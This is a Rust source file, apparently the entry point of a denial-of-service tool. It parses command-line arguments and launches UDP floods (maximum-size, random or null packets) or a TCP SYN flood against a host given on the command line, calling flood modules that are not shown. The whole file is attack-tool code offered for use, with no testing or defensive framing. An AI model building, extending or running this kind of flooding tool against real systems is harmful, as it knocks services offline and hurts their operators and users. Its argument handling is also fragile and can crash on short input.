mod udp;
mod tcp;

use std::env;

fn main(){	
	let args: Vec<String> = env::args().collect();
	let mut pack_len: u16 = 65507;
	
	if args.len() <= 1 {
		println!("Need more than one arguments!!");
		std::process::exit(1);
		
	} else if args.len() == 2 {
		println!("No attack type specified!");
		std::process::exit(1);
		
	}
	
	if args[1] == "udp" {
		if args[2] == "--flood" || args[2] == "-f" {
			if args[3] == "--max" || args[3] == "-m" {
				udp::flood::max(&args[4], pack_len);
				
			} else if args[3] == "--random" || args[3] == "-r" {
				udp::flood::rnd(&args[4], pack_len);
				
			} else if args[3] == "--null" || args[3] == "-n" { 
				udp::flood::null(&args[4]);
			} else {
				println!("Invalid UDP flood attack type!");
			}
			
			
		} else {
			println!("Invalid UDP attack type!");
		}
	} else if args[1] == "tcp" {
		if args[2] == "--flood" || args[2] == "-f" {
			if args[3] == "--syn" || args[3] == "-s" {
				tcp::flood::packet::syn(args[4].parse().unwrap(), String::from(&args[5]), 0)
			}
		} else {
			println!("Invalid TCP attack type!");
		}
	} else {
		println!("Invalid attack type!");
	}
}
